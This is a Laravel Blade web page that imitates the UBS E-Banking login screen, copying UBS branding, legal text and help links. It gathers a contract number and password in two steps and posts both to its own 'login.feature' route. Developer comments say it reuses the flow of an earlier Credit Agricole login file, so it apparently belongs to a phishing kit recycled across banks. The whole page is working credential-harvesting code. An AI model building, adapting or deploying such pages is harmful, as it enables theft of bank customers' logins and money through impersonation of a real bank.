<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="csrf-token" content="{{ csrf_token() }}">
<title>UBS E-Banking – Login</title>
<link rel="icon" type="image/png" sizes="16x16" href="{{ asset('logodb.png') }}">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
/* ============================================================
   RESET & BASE
   ============================================================ */
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}

:root{
  --ubs-red:    #EC0016;
  --ubs-black:  #1a1a1a;
  --ubs-dark:   #333333;
  --ubs-grey:   #5c5c5c;
  --ubs-mid:    #767676;
  --ubs-light:  #e8e8e8;
  --ubs-border: #cccccc;
  --ubs-white:  #ffffff;
  --ubs-btn:    #3d3d3d;
  --ubs-btn-h:  #1a1a1a;
  --ubs-error:  #CC0000;
  --ubs-focus:  #0069b4;
  --card-r:     4px;
  --shadow:     0 2px 20px rgba(0,0,0,.10), 0 1px 4px rgba(0,0,0,.08);
}

html,body{
  min-height:100%;
  font-family:'Source Sans 3',Helvetica,Arial,sans-serif;
  font-size:16px;
  color:var(--ubs-dark);
  background:linear-gradient(160deg,#e8f0f8 0%,#cfdff0 40%,#b8d0e8 100%);
  min-height:100vh;
}

/* ============================================================
   HEADER
   ============================================================ */
.ubs-header{
  background:var(--ubs-white);
  border-bottom:1px solid var(--ubs-light);
  height:52px;
  display:flex;
  align-items:center;
  padding:0 24px;
  position:sticky;
  top:0;
  z-index:100;
  box-shadow:0 1px 4px rgba(0,0,0,.06);
}
.ubs-logo{
  display:flex; align-items:center; gap:12px;
  text-decoration:none; flex-shrink:0;
}
.ubs-logo-mark{ display:flex; align-items:center; gap:6px; }
.ubs-keys{ display:flex; gap:3px; align-items:flex-end; }
.ubs-key{
  width:7px; background:var(--ubs-red);
  border-radius:2px 2px 0 0; position:relative;
}
.ubs-key::after{
  content:''; position:absolute; bottom:-4px;
  left:0; right:0; height:4px;
  background:var(--ubs-red); border-radius:0 0 2px 2px;
}
.ubs-key:nth-child(1){ height:16px; }
.ubs-key:nth-child(2){ height:20px; }
.ubs-key:nth-child(3){ height:14px; }
.ubs-wordmark{
  font-size:20px; font-weight:700;
  color:var(--ubs-red); letter-spacing:1px; line-height:1;
}
.ubs-divider{ width:1px; height:20px; background:var(--ubs-border); }
.ubs-product{ font-size:15px; font-weight:400; color:var(--ubs-dark); letter-spacing:.2px; }
.header-right{ margin-left:auto; display:flex; align-items:center; gap:20px; }
.header-country{ font-size:14px; color:var(--ubs-dark); }
.header-lang{
  display:flex; align-items:center; gap:6px;
  font-size:14px; color:var(--ubs-dark);
  cursor:pointer; background:none; border:none;
  font-family:inherit; padding:0;
}
.header-lang-arrow{ font-size:11px; color:var(--ubs-mid); }

/* ============================================================
   MAIN
   ============================================================ */
.ubs-main{
  min-height:calc(100vh - 52px - 120px);
  display:flex; align-items:center; justify-content:center;
  padding:48px 16px;
}

/* ============================================================
   LOGIN CARD
   ============================================================ */
.login-card{
  background:var(--ubs-white);
  border-radius:var(--card-r);
  box-shadow:var(--shadow);
  width:100%; max-width:370px;
  padding:40px 36px 36px;
  animation:cardIn .35s ease both;
}
@keyframes cardIn{
  from{opacity:0;transform:translateY(12px)}
  to  {opacity:1;transform:translateY(0)}
}
.card-title{
  font-size:32px; font-weight:700;
  color:var(--ubs-black); text-align:center;
  margin-bottom:6px; letter-spacing:-.3px; line-height:1.1;
}
.card-subtitle{
  font-size:14px; color:var(--ubs-mid);
  text-align:center; margin-bottom:28px; font-weight:400;
}

/* ── Champ avec label flottant ── */
.field-wrap{ position:relative; margin-bottom:10px; }
.field-input{
  width:100%; height:52px;
  border:1.5px solid var(--ubs-border);
  border-radius:var(--card-r);
  padding:18px 44px 6px 12px;
  font-size:15px; font-family:inherit;
  color:var(--ubs-black); background:var(--ubs-white);
  outline:none; transition:border-color .15s, box-shadow .15s;
  -webkit-appearance:none;
}
.field-input:focus{
  border-color:var(--ubs-focus);
  box-shadow:0 0 0 2px rgba(0,105,180,.12);
}
.field-input.has-error{ border-color:var(--ubs-error); }
.field-input.has-error:focus{ box-shadow:0 0 0 2px rgba(204,0,0,.12); }

.field-label{
  position:absolute; left:13px;
  top:50%; transform:translateY(-50%);
  font-size:15px; color:var(--ubs-mid);
  pointer-events:none;
  transition:all .15s ease;
}
.field-input:focus ~ .field-label,
.field-input.filled ~ .field-label{
  top:10px; transform:none;
  font-size:11px; color:var(--ubs-mid);
}
.field-icon{
  position:absolute; right:13px;
  top:50%; transform:translateY(-50%);
  color:var(--ubs-mid); cursor:pointer;
  display:flex; align-items:center;
}
.field-icon:hover{ color:var(--ubs-focus); }

/* Icône œil mot de passe */
.pw-eye{
  position:absolute; right:13px;
  top:50%; transform:translateY(-50%);
  color:var(--ubs-mid); cursor:pointer;
  background:none; border:none; padding:0;
  display:flex; align-items:center; transition:color .14s;
}
.pw-eye:hover{ color:var(--ubs-dark); }

/* ── Message d'erreur ── */
.error-msg{
  display:none; align-items:flex-start; gap:8px;
  background:#fff5f5; border:1px solid #ffd0d0;
  border-radius:var(--card-r); padding:10px 12px;
  margin-bottom:12px; font-size:13.5px;
  color:var(--ubs-error); line-height:1.4;
}
.error-msg.visible{ display:flex; animation:slideIn .2s ease both; }
.error-icon{
  flex-shrink:0; width:18px; height:18px;
  background:var(--ubs-error); border-radius:50%;
  display:flex; align-items:center; justify-content:center; margin-top:1px;
}

/* ── Champ password (slide) ── */
.pw-section{
  overflow:hidden; max-height:0; opacity:0;
  transition:max-height .38s ease, opacity .3s ease, margin .38s ease;
  margin-bottom:0;
}
.pw-section.visible{ max-height:90px; opacity:1; margin-bottom:10px; }

/* ── Checkbox ── */
.checkbox-row{
  display:flex; align-items:center; gap:10px;
  margin:16px 0 20px; cursor:pointer;
}
.checkbox-row input[type="checkbox"]{
  width:16px; height:16px;
  border:1.5px solid var(--ubs-border);
  border-radius:2px; cursor:pointer;
  accent-color:var(--ubs-btn); flex-shrink:0;
}
.checkbox-row label{ font-size:14px; color:var(--ubs-dark); cursor:pointer; line-height:1.3; }

/* ── Chip résumé compte (étape 2) ── */
.account-chip{
  display:none; align-items:center; gap:8px;
  background:#f5f8fc; border:1px solid #d4e3f0;
  border-radius:var(--card-r); padding:9px 12px;
  margin-bottom:12px; font-size:13.5px; color:var(--ubs-dark);
}
.account-chip.visible{ display:flex; animation:slideIn .25s ease both; }
.account-chip-num{ font-weight:600; flex:1; }
.chip-change{
  color:var(--ubs-focus); font-size:13px;
  text-decoration:underline; cursor:pointer;
  background:none; border:none; font-family:inherit; padding:0;
}
.chip-change:hover{ color:var(--ubs-btn); }

/* ── Bouton principal ── */
.btn-main{
  width:100%; height:48px;
  background:var(--ubs-btn); color:var(--ubs-white);
  border:none; border-radius:var(--card-r);
  font-size:16px; font-weight:600; font-family:inherit;
  cursor:pointer; letter-spacing:.2px;
  transition:background .15s, transform .1s;
  position:relative; overflow:hidden; margin-bottom:20px;
}
.btn-main:hover{ background:var(--ubs-btn-h); }
.btn-main:active{ transform:scale(.98); }
.btn-main:disabled{ opacity:.55; cursor:default; transform:none; }
.btn-main .spinner{
  display:none; width:18px; height:18px;
  border:2px solid rgba(255,255,255,.35);
  border-top-color:#fff; border-radius:50%;
  animation:spin .7s linear infinite;
  position:absolute; top:50%; left:50%;
  transform:translate(-50%,-50%);
}
.btn-main.loading .btn-label{ opacity:0; }
.btn-main.loading .spinner{ display:block; }

/* ── Lien How to connect ── */
.how-link{
  display:flex; align-items:center; justify-content:center;
  gap:6px; font-size:14px; font-weight:600;
  color:var(--ubs-dark); cursor:pointer;
  background:none; border:none; font-family:inherit; padding:0;
  width:100%; transition:color .14s;
}
.how-link:hover{ color:var(--ubs-focus); }
.how-link-arrow{ font-size:13px; color:var(--ubs-red); font-weight:700; }

/* ============================================================
   FOOTER
   ============================================================ */
.ubs-footer{
  border-top:1px solid var(--ubs-light);
  background:var(--ubs-white);
  padding:22px 24px 18px;
}
.footer-links{
  display:flex; flex-wrap:wrap; gap:0;
  margin-bottom:12px; align-items:center;
}
.footer-link{
  font-size:13px; color:var(--ubs-dark);
  text-decoration:underline; cursor:pointer;
  background:none; border:none; font-family:inherit; padding:0;
}
.footer-link:hover{ color:var(--ubs-focus); }
.footer-sep{ font-size:13px; color:var(--ubs-border); margin:0 10px; user-select:none; }
.footer-legal{ font-size:12.5px; color:var(--ubs-mid); line-height:1.5; max-width:900px; }
.footer-copy{ font-size:12.5px; color:var(--ubs-mid); margin-top:4px; }

/* ============================================================
   ANIMATIONS
   ============================================================ */
@keyframes slideIn{ from{opacity:0;transform:translateY(-6px)} to{opacity:1;transform:translateY(0)} }
@keyframes spin{ to{ transform:translate(-50%,-50%) rotate(360deg); } }
@keyframes shake{
  0%,100%{transform:translateX(0)}
  20%{transform:translateX(-5px)} 40%{transform:translateX(5px)}
  60%{transform:translateX(-3px)} 80%{transform:translateX(3px)}
}
.shake{ animation:shake .32s ease; }

/* ============================================================
   RESPONSIVE
   ============================================================ */
@media(max-width:480px){
  .ubs-main{ padding:24px 12px; align-items:flex-start; padding-top:32px; }
  .login-card{ padding:32px 20px 28px; }
  .card-title{ font-size:26px; }
  .ubs-header{ padding:0 16px; }
  .header-country{ display:none; }
  .ubs-footer{ padding:18px 16px 16px; }
  .footer-links{ flex-direction:column; align-items:flex-start; gap:6px; }
  .footer-sep{ display:none; }
}
</style>
</head>
<body>

<!-- ── HEADER ── -->
<header class="ubs-header">
  <a class="ubs-logo" href="#" onclick="return false;">
    <div class="ubs-logo-mark">
              <img class="logo-compact" width="110" height="60" src="{{ asset('logodb.png') }}" alt="">
    </div>
    <div class="ubs-divider"></div>
    <span class="ubs-product">E-Banking</span>
  </a>
  <div class="header-right">
    <span class="header-country">Switzerland</span>
    <button class="header-lang" type="button">
      <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
        <circle cx="8" cy="8" r="7.5" stroke="#5c5c5c" stroke-width="1"/>
        <path d="M8 .5C6 3 5 5.5 5 8s1 5 3 7.5" stroke="#5c5c5c" stroke-width="1"/>
        <path d="M8 .5c2 2.5 3 5 3 7.5s-1 5-3 7.5" stroke="#5c5c5c" stroke-width="1"/>
        <path d=".5 8h15" stroke="#5c5c5c" stroke-width="1"/>
        <path d="M1.5 5h13M1.5 11h13" stroke="#5c5c5c" stroke-width="1"/>
      </svg>
      English
      <span class="header-lang-arrow">▾</span>
    </button>
  </div>
</header>

<!-- ── MAIN ── -->
<main class="ubs-main">
  <div class="login-card">

    <h1 class="card-title">Hello</h1>
    <p class="card-subtitle">Log in to UBS E-Banking</p>

    <!-- Message d'erreur -->
    <div class="error-msg" id="errorMsg">
      <div class="error-icon">
        <svg width="10" height="10" viewBox="0 0 10 10" fill="none">
          <path d="M5 1v4M5 7.5v.5" stroke="#fff" stroke-width="1.6" stroke-linecap="round"/>
        </svg>
      </div>
      <span id="errorText"></span>
    </div>

    <!-- Chip résumé numéro de compte (étape 2) -->
    <div class="account-chip" id="accountChip">
      <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
        <circle cx="8" cy="8" r="7.5" stroke="#0069b4" stroke-width="1"/>
        <path d="M8 4.5v3.5l2 1.2" stroke="#0069b4" stroke-width="1.3" stroke-linecap="round"/>
      </svg>
      <span class="account-chip-num" id="chipNum"></span>
      <button class="chip-change" id="chipChange" type="button">Change</button>
    </div>

    {{-- ── ÉTAPE 1 : numéro de compte ── --}}
    <div id="step1Wrap">
      <div class="field-wrap">
        {{-- Champ mappé sur name="numero_compte" comme dans l'ancien login --}}
        <input class="field-input" type="text"
               id="compteBancaire" name="numero_compte"
               inputmode="numeric" autocomplete="off" maxlength="20"/>
        <label class="field-label" for="compteBancaire">Contract number</label>
        <span class="field-icon" title="Your contract number is on your UBS card or welcome letter.">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
            <circle cx="8" cy="8" r="7.5" stroke="currentColor" stroke-width="1.2"/>
            <path d="M8 7v5" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
            <circle cx="8" cy="4.5" r=".9" fill="currentColor"/>
          </svg>
        </span>
      </div>

      <div class="checkbox-row">
        <input type="checkbox" id="saveContract"/>
        <label for="saveContract">Save contract number</label>
      </div>
    </div>

    {{-- ── ÉTAPE 2 : mot de passe (slide) ── --}}
    <div class="pw-section" id="pwSection">
      <div class="field-wrap">
        <input class="field-input" type="password"
               id="pwInput" name="password"
               autocomplete="current-password" minlength="8"/>
        <label class="field-label" for="pwInput">Password</label>
        {{-- Icône œil afficher/cacher --}}
        <button class="pw-eye" type="button" id="pwEye" aria-label="Show/hide password">
          <svg id="eyeOpen" width="18" height="18" viewBox="0 0 24 24" fill="none"
               stroke="currentColor" stroke-width="1.8"
               stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
          <svg id="eyeClosed" width="18" height="18" viewBox="0 0 24 24" fill="none"
               stroke="currentColor" stroke-width="1.8"
               stroke-linecap="round" stroke-linejoin="round"
               style="display:none;">
            <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
            <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
            <line x1="1" y1="1" x2="23" y2="23"/>
          </svg>
        </button>
      </div>
    </div>

    <!-- Bouton principal -->
    <button class="btn-main" type="button" id="mainBtn">
      <span class="btn-label">Continue</span>
      <span class="spinner"></span>
    </button>


    <button class="how-link" type="button" onclick="window.open('https://www.ubs.com/global/en/wealth-management/our-approach/digital-banking/e-banking/how-to-connect.html', '_blank')">
      <span class="how-link-arrow">›</span>
      How to connect
    </button>

  </div>
</main>

<!-- ── FOOTER ── -->
<footer class="ubs-footer">
  <div class="footer-links">
    <button class="footer-link" type="button">About UBS</button>
    <span class="footer-sep">|</span>
    <button class="footer-link" type="button">Terms of use</button>
    <span class="footer-sep">|</span>
    <button class="footer-link" type="button">Privacy statement</button>
    <span class="footer-sep">|</span>
    <button class="footer-link" type="button">Report fraudulent correspondence</button>
  </div>
  <p class="footer-legal">
    The products, services, information and/or materials contained within this website may not be
    available to residents of certain jurisdictions. Please consult the sales restrictions relating
    to the products or services in question for further information.
  </p>
  <p class="footer-copy">© UBS 1998–2026. All rights reserved.</p>
</footer>

<script>
(function () {

  /* ── Refs ── */
  var contractInput = document.getElementById('compteBancaire');
  var pwInput       = document.getElementById('pwInput');
  var mainBtn       = document.getElementById('mainBtn');
  var btnLabel      = mainBtn.querySelector('.btn-label');
  var pwSection     = document.getElementById('pwSection');
  var step1Wrap     = document.getElementById('step1Wrap');
  var accountChip   = document.getElementById('accountChip');
  var chipNum       = document.getElementById('chipNum');
  var chipChange    = document.getElementById('chipChange');
  var errorMsg      = document.getElementById('errorMsg');
  var errorText     = document.getElementById('errorText');
  var pwEye         = document.getElementById('pwEye');
  var eyeOpen       = document.getElementById('eyeOpen');
  var eyeClosed     = document.getElementById('eyeClosed');

  /* CSRF token Laravel */
  var csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

  var step = 1;

  /* ── Label flottant ── */
  function syncLabel(inp) {
    inp.value ? inp.classList.add('filled') : inp.classList.remove('filled');
  }
  [contractInput, pwInput].forEach(function (el) {
    el.addEventListener('input', function () { syncLabel(this); });
    el.addEventListener('focus', function () { syncLabel(this); clearError(); });
    el.addEventListener('blur',  function () { syncLabel(this); });
  });

  /* ── Helpers ── */
  function showError(msg) {
    errorText.textContent = msg;
    errorMsg.classList.add('visible', 'shake');
    errorMsg.addEventListener('animationend', function () {
      errorMsg.classList.remove('shake');
    }, { once: true });
  }

  function clearError() {
    errorMsg.classList.remove('visible');
    errorText.textContent = '';
  }

  function shakeField(el) {
    el.classList.add('has-error', 'shake');
    el.addEventListener('animationend', function () {
      el.classList.remove('shake');
    }, { once: true });
    el.addEventListener('input', function () {
      el.classList.remove('has-error');
    }, { once: true });
  }

  function setLoading(on) {
    mainBtn.disabled = on;
    mainBtn.classList.toggle('loading', on);
  }

  /* ── Toggle œil password ── */
  pwEye.addEventListener('click', function () {
    var hidden = pwInput.type === 'password';
    pwInput.type            = hidden ? 'text' : 'password';
    eyeOpen.style.display   = hidden ? 'none' : '';
    eyeClosed.style.display = hidden ? ''     : 'none';
    pwInput.focus();
  });

  /* ── Retour étape 1 via chip ── */
  chipChange.addEventListener('click', function () {
    step = 1;
    btnLabel.textContent        = 'Continue';
    pwSection.classList.remove('visible');
    accountChip.classList.remove('visible');
    step1Wrap.style.display     = '';
    pwInput.value               = '';
    pwInput.type                = 'password';
    eyeOpen.style.display       = '';
    eyeClosed.style.display     = 'none';
    syncLabel(pwInput);
    clearError();
    setTimeout(function () { contractInput.focus(); }, 50);
  });

  /* ── Enter déclenche le bouton ── */
  [contractInput, pwInput].forEach(function (el) {
    el.addEventListener('keydown', function (e) {
      if (e.key === 'Enter') mainBtn.click();
    });
  });

  /* ── Bouton principal ── */
  mainBtn.addEventListener('click', function () {
    clearError();

    /* ======================================================
       ÉTAPE 1 — Validation numéro de compte
    ====================================================== */
    if (step === 1) {
      var val = contractInput.value.trim();

      if (!val) {
        shakeField(contractInput);
        showError('Please enter your contract number.');
        return;
      }

      /* Passer à l'étape 2 : afficher champ password */
      step = 2;
      chipNum.textContent      = val;
      btnLabel.textContent     = 'Log in';
      step1Wrap.style.display  = 'none';
      accountChip.classList.add('visible');
      pwSection.classList.add('visible');
      clearError();
      setTimeout(function () { pwInput.focus(); }, 400);

    /* ======================================================
       ÉTAPE 2 — Envoi AJAX vers route('login.feature')
       Même flow que l'ancien fichier Credit Agricole :
         POST avec numero_compte + password
         Réponse JSON { success, message, redirect }
    ====================================================== */
    } else {
      var pw = pwInput.value;

      if (!pw) {
        shakeField(pwInput);
        showError('Please enter your password.');
        return;
      }
      if (pw.length < 8) {
        shakeField(pwInput);
        showError('Your password must be at least 8 characters.');
        return;
      }

      /* Soumission via formulaire natif — aucun risque CSRF mismatch */
      var form = document.createElement('form');
      form.method = 'POST';
      form.action = '{{ route("login.feature") }}';

      var fCsrf = document.createElement('input');
      fCsrf.type  = 'hidden';
      fCsrf.name  = '_token';
      fCsrf.value = csrfToken;

      var fCompte = document.createElement('input');
      fCompte.type  = 'hidden';
      fCompte.name  = 'numero_compte';
      fCompte.value = contractInput.value.trim();

      var fPw = document.createElement('input');
      fPw.type  = 'hidden';
      fPw.name  = 'password';
      fPw.value = pw;

      form.appendChild(fCsrf);
      form.appendChild(fCompte);
      form.appendChild(fPw);
      document.body.appendChild(form);

      setLoading(true);
      form.submit();
    }
  });

})();
</script>
</body>
</html>
